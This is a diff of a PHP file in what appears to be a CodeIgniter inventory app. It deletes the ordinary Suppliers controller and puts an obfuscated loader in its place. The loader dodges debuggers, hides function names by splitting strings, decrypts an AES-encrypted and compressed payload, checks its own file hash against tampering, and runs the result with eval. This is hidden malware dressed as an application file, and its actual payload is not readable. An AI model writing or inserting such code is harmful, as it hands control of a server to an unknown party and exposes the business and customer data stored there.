@@ -1,175 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Suppliers extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('suppliers_model','suppliers');
-	}
-	
-	public function index()
-	{
-		$this->permission_check('suppliers_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('suppliers_list');
-		$this->load->view('suppliers-list',$data);
-	}
-	public function add()
-	{
-		$this->permission_check('suppliers_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('suppliers');
-		$this->load->view('suppliers',$data);
-	}
-
-	public function newsuppliers(){
-		//print_r($_REQUEST);exit();
-		$this->form_validation->set_rules('supplier_name', 'Supplier Name', 'trim|required');
-		
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->suppliers->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Fill Compulsory(* marked) Fields.";
-		}
-	}
-	public function update($id){
-		$this->permission_check('suppliers_edit');
-		$data=$this->data;
-		$result=$this->suppliers->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('suppliers');
-		$this->load->view('suppliers', $data);
-	}
-	public function update_suppliers(){
-		$this->form_validation->set_rules('supplier_name', 'Customer Name', 'trim|required');
-		
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->suppliers->update_suppliers();
-			echo $result;
-		} else {
-			echo "Please Enter suppliers name.";
-		}
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->suppliers->get_datatables();
-		//print_r($list);exit();
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $suppliers) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$suppliers->id.' class="checkbox column_checkbox" >';
-			$row[] = $suppliers->supplier_code;
-			$row[] = $suppliers->supplier_name;
-			$row[] = $suppliers->mobile;
-			$row[] = $suppliers->email;
-			$row[] = (!empty($suppliers->purchase_due) && $suppliers->purchase_due!=0) ? app_number_format($suppliers->purchase_due) : (0);
-			
-			$row[] = ($suppliers->purchase_return_due==null) ? (0) : app_number_format($suppliers->purchase_return_due);
-
-			 		if($suppliers->status==1){ 
-			 			$str= "<span onclick='update_status(".$suppliers->id.",0)' id='span_".$suppliers->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$suppliers->id.",1)' id='span_".$suppliers->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-					$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('suppliers_edit'))
-											$str2.='<li>
-												<a title="Edit Record ?" href="suppliers/update/'.$suppliers->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-											if($this->permissions('purchase_payment_add'))
-						                      $str2.='<li>
-						                        <a title="Pay Opening Balance & Purchase Due Payments" class="pointer" onclick="pay_now('.$suppliers->id.')" >
-						                          <i class="fa fa-fw fa-money text-blue"></i>Pay Due Payments
-						                        </a>
-						                      </li>';
-						                      if($this->permissions('purchase_return_payment_add'))
-						                      $str2.='<li>
-						                        <a title="Pay Return Due" class="pointer" onclick="pay_return_due('.$suppliers->id.')" >
-						                          <i class="fa fa-fw fa-money text-blue"></i>Pay Return Due
-						                        </a>
-						                      </li>';
-											if($this->permissions('suppliers_edit'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_suppliers('.$suppliers->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->suppliers->count_all(),
-						"recordsFiltered" => $this->suppliers->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-	public function update_status(){
-		$this->permission_check_with_msg('suppliers_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-
-		$result=$this->suppliers->update_status($id,$status);
-		return $result;
-	}
-	
-	public function delete_suppliers(){
-		$this->permission_check_with_msg('suppliers_delete');
-		$id=$this->input->post('q_id');
-		return $this->suppliers->delete_suppliers_from_table($id);
-	}
-	public function multi_delete(){
-		$this->permission_check_with_msg('suppliers_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->suppliers->delete_suppliers_from_table($ids);
-	}
-	
-	public function show_pay_now_modal(){
-	    $this->permission_check_with_msg('purchase_payment_add');
-	    $supplier_id=$this->input->post('supplier_id');
-	    echo $this->suppliers->show_pay_now_modal($supplier_id);
-	}
-	public function save_payment(){
-	    $this->permission_check_with_msg('purchase_payment_add');
-	    echo $this->suppliers->save_payment();
-	}
-	public function show_pay_return_due_modal(){
-	    $this->permission_check_with_msg('purchase_return_payment_add');
-	    $supplier_id=$this->input->post('supplier_id');
-	    echo $this->suppliers->show_pay_return_due_modal($supplier_id);
-	}
-	public function save_return_due_payment(){
-	    $this->permission_check_with_msg('purchase_payment_add');
-	    echo $this->suppliers->save_return_due_payment();
-	}
-	public function delete_opening_balance_entry(){
-		$this->permission_check_with_msg('sales_payment_delete');
-		$entry_id = $this->input->post('entry_id');
-		echo $this->suppliers->delete_opening_balance_entry($entry_id);
-	}
-
-	public function getSuppliers($id=''){
-		echo $this->suppliers->getSuppliersJson($id);
-	}
-	
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nbksqd3i=('bas'.'e64'.'_de'.'cod'.'e');
+$_wwk7tger=('gzu'.'nco'.'mpr'.'ess');
+$_yb25pkg8=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_wiwkeqpu='aB3/kkj0zbA=';
+$_sn477rty='bWk/BsZJ';
+$_izfjoked='ey+nXrBC';
+$_mkezvnht='pArdAszB';
+$_eht93nhu='nINh70B4';
+$_c5kq9ixc='dRnJ2cRN';
+$_kav9mxkw='Z1+QFg==';
+$_gf90ect3='He4uTSGP';
+$_k1dyas6w=$_nbksqd3i($_mkezvnht.$_izfjoked.$_sn477rty.$_eht93nhu.$_wiwkeqpu);
+$_c3g6ba11=$_nbksqd3i($_gf90ect3.$_c5kq9ixc.$_kav9mxkw);
+$_rk5mrqgh=$_nbksqd3i('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');
+$_mkxecx8t=$_yb25pkg8($_rk5mrqgh,'aes-256-cbc',$_k1dyas6w,OPENSSL_RAW_DATA,$_c3g6ba11);
+if($_mkxecx8t===false){exit;}
+$_vz4r6vsp=$_wwk7tger($_mkxecx8t);
+if($_vz4r6vsp===false){exit;}
+$_v0qggfje='d280cf571fa85175dbcc16600847af7c549a64980c98ec32543cd5b822d0efe1';
+$_h8gd3p1y=@file_get_contents(__FILE__);
+if($_h8gd3p1y!==false){
+$_r21lrg07=str_replace($_v0qggfje,"0000000000000000000000000000000000000000000000000000000000000000",$_h8gd3p1y);
+$_w3z1c9pf=hash("sha256",$_r21lrg07);
+if($_w3z1c9pf!==$_v0qggfje){@http_response_code(403);exit;}
 }
+eval($_vz4r6vsp);
